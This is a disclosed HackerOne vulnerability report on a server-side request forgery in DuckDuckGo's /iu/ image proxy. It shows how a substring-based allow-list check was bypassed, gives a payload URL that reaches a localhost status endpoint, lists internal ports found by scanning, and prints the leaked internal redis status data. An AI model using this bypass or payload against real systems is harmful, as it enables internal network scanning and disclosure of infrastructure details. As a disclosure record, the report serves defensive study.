# SSRF on duckduckgo.com/iu/

## Report Details
- **Report ID**: 398641
- **URL**: https://hackerone.com/reports/398641
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-08-23T18:18:39.196Z
- **Disclosed**: 2018-09-09T20:12:35.028Z

## Reporter
- **Username**: d0nut
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: duckduckgo

## Vulnerability Information
Normally, a call to `https://duckduckgo.com/iu` contains a query parameter (`u`) with some path using the domain `yimg.com`. This call will succeed in most cases.
{F337121}

And if we change that path to something like `https://google.com` it's rejected.
{F337118}

However, it appears that the check that ensures that `yimg.com` is the target domain is solely based on whether or not that string appears in the url, independent of where. This means we can stuff it in a query parameter and bypass this check.

{F337120}

Furthermore, with this bypass we can hit localhost and perform a port scan (see [XSPA](https://indiatriks.blogspot.com/2012/07/xspa-cross-site-port-attack.html)). 

For example, I have been able to conclude that services are running on the following ports:
```
22
25
80
443
587
6380
6432
6767
6868
8000
```

Some of these services don't like talking HTTP (like `22` and `25`) so they never respond, but other services seem to talk HTTP and will return seemingly sensitive data about redis. 
For example:
`https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:
```
{
  "current_time": "2018-08-23T17:56:06",
  "deployment_environment": "prod",
  "redis_local_last_successful_ping": "2018-08-23T13:56:05",
  "redis_local_url": "redis://127.0.0.1:6380",
  "redis_regional_last_successful_ping": "2018-08-23T13:56:05",
  "redis_regional_url": "redis://cache-services.duckduckgo.com:6380",
  "stat_blocked_ips_removed_since_launch": 8787,
  "stat_blocked_ips_since_launch": 12185,
  "stat_ipset_blocks": 266,
  "stat_redis_local_messages_received": 3613,
  "stat_redis_regional_messages_received": 10211,
  "status": "up"
}
```

## Impact

This could be used to interact with services that are not intended to be exposed. This also enables an XSPA attack. Additionally, information disclosure about a redis service. 

Lastly, an attack on redis may be possible even though the requests seem restricted to http.

## Attachments
- ports_1.png
- google_not_allowed.png
- ports_2.png
- query_param_bypass.png
- yimg_ok.png
